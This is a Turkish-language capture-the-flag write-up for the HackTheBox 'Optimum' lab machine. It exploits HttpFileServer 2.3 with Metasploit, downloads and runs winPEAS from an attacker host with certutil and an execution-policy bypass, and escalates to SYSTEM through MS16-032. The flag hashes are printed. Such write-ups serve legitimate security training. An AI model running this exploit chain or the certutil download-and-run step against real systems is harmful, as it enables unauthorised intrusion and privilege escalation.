<img width="577" height="373" alt="1_DU6hHRbTMZElXONdJf5bXQ" src="https://github.com/user-attachments/assets/086da8bb-1d87-43b1-ab7b-291d6fee4a17" />


#### About

Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete.

---

İlk olarak nmap taraması ile başlıyorum:

```
nmap -sS -A -T5 -p- 10.129.51.132
```

<img width="1060" height="348" alt="nmap" src="https://github.com/user-attachments/assets/7140655c-25a4-4419-ab1a-1821c0f186d6" />

Sadece 80 portu açık, o zaman siteye gidiyorum. Siteye gidince karşıma direkt bilgiler çıkıyor:

<img width="511" height="564" alt="site" src="https://github.com/user-attachments/assets/a4ac7e46-80e6-4247-a659-e52f67c4934f" />

Sürüm numarası burada net yazıyor, HttpFileServer 2.3. Bunu aratarak bilinen bir exploit bulabileceğimi düşündüm:

```bash
searchsploit HttpFileServer 2.3
```

<img width="1367" height="202" alt="1" src="https://github.com/user-attachments/assets/9dee30cf-ef01-4854-a65d-961c7bc93570" />


Elimde bir RCE var — bunun Metasploit'te de modülü olduğunu biliyordum, direkt msfconsole'a geçtim.

```
msf > search HttpFileServer 2.3
```

<img width="1027" height="328" alt="msfconsole" src="https://github.com/user-attachments/assets/0630a282-e4a7-46c0-8c96-ee0b478246fb" />

Modülü seçip gerekli ayarları yapıyorum:

<img width="1056" height="671" alt="msfconsole2" src="https://github.com/user-attachments/assets/52a620e0-d419-43d7-a983-8cd039e1b781" />

```
msf > use 0
msf exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.129.51.132
msf exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.14.187
msf exploit(windows/http/rejetto_hfs_exec) > check
[*] 10.129.51.132:80 - The service is running, but could not be validated. Target detected with version: 2.3
msf exploit(windows/http/rejetto_hfs_exec) > run
```
<img width="666" height="112" alt="msfconsole3" src="https://github.com/user-attachments/assets/270b7ffd-72b2-420a-ab2b-930b50bd7e8a" />

Elimde shell var. Direkt desktop'a bakıyorum:

```
meterpreter > dir
Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2026-09-08 20:12:06 -0400  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 07:57:16 -0400  desktop.ini
100777/rwxrwxrwx  760320  fil   2017-03-18 08:11:17 -0400  hfs.exe
100444/r--r--r--  34      fil   2026-09-08 19:53:22 -0400  user.txt

meterpreter > cat user.txt
799dbbfbf91d6a1c1d0fed255b7210f3
```

<img width="569" height="281" alt="shellartıflag" src="https://github.com/user-attachments/assets/e9927425-2f02-4e67-9420-34bf3c2d864a" />

User flag'i aldım. Şimdi privesc tarafına bakmam lazım. Sisteme winPEAS'i attım ve çalıştırdım, ne dönecek diye baktım:

<img width="657" height="336" alt="httpserver" src="https://github.com/user-attachments/assets/e5d2b14e-c866-4418-af08-2caa1df7ed9b" />

```
C:\Windows\Temp>certutil -urlcache -split -f http://10.10.14.187:8000/winPEAS.ps1 C:\Users\Public\winPEAS.ps1
CertUtil: -URLCache command completed successfully.

C:\Windows\Temp>powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\winPEAS.ps1
```
<img width="878" height="172" alt="winpeas" src="https://github.com/user-attachments/assets/d6d8a6fa-8f57-42ee-99f9-2187c4796cf6" />

winPEAS çıktısında beni ilgilendiren kısım sistem bilgisi ve hotfix listesiydi:

<img width="728" height="562" alt="winpeas2" src="https://github.com/user-attachments/assets/c4c8a6b8-a481-4122-bb0b-fcc736f476f8" />

<img width="974" height="744" alt="winpeas3" src="https://github.com/user-attachments/assets/2352030e-288f-4764-91a9-eeb50458b35f" />

Build 9600 ve son kurulu hotfix KB3014442 — bunu görünce sistemin patch seviyesinin epey eski olduğunu fark ettim. Bu iki bilgiyi (build numarası + son hotfix) araştırdım, hangi güncellemenin eksik olduğuna baktım. Sonuç olarak sistemin **MS16-032 / Secondary Logon** açığına karşı yamalı olmadığını gördüm — bu açığı kapatan güncelleme hotfix listesinde yoktu.

MS16-032'yi biraz araştırdığımda şunu öğrendim: bu, Windows'un Secondary Logon servisinde, `CreateProcessWithLogonW` API'sini kullanarak tetiklenen bir handle/token sızıntısı zafiyeti. Kısaca, ayrıcalıklı bir servis proses'i (svchost) geçersiz kimlik bilgileriyle başarısız bir logon denemesi sırasında SYSTEM yetkisinde bir thread handle'ı bırakıyor, ve düşük yetkili kullanıcı bu handle'ı yakalayıp `NtImpersonateThread` / `DuplicateToken` ile kendi SYSTEM token'ını oluşturabiliyor. Metasploit'te bunun da hazır bir modülü olduğunu gördüm.

```
meterpreter > background
msf exploit(windows/http/rejetto_hfs_exec) > search ms16_032
```

<img width="1243" height="379" alt="root1" src="https://github.com/user-attachments/assets/c32a2093-9273-436a-8331-07dab0bd7827" />

Modülü seçip mevcut session'ı bağlıyorum:

```
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > sessions
```

```
Id  Name  Type                     Information               Connection
--  ----  ----                     -----------               ----------
2         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.187:4444 -> 10.129.51.132:49172
```

```
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 2
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.14.187
msf exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
```

<img width="896" height="705" alt="root2" src="https://github.com/user-attachments/assets/16bd9e6b-d3e9-4d28-b7f6-06c7d4764af5" />

Çalıştırdığımda script yukarıda okuduğum mekanizmayı adım adım uyguluyor:

```
[*] Meterpreter session 4 opened (10.10.14.187:4444 -> 10.129.51.132:49173) at 2026-09-02 12:19:51 -0400
```

Yeni session'a geçip shell'e düşüyorum, yetkiyi kontrol ediyorum:

```
meterpreter > shell
C:\Users\kostas\Desktop>whoami
nt authority\system
```

SYSTEM oldum. Şimdi Administrator'ın masaüstüne gidip root flag'i alıyorum:

```
C:\Users\Administrator\Desktop>dir
09/09/2026  02:53                34 root.txt

C:\Users\Administrator\Desktop>type root.txt
b4a3294e59e62c5015391024c1e75006
```

<img width="421" height="217" alt="rootflag" src="https://github.com/user-attachments/assets/58b13934-bfac-49f6-b8d4-e4c295e26d95" />
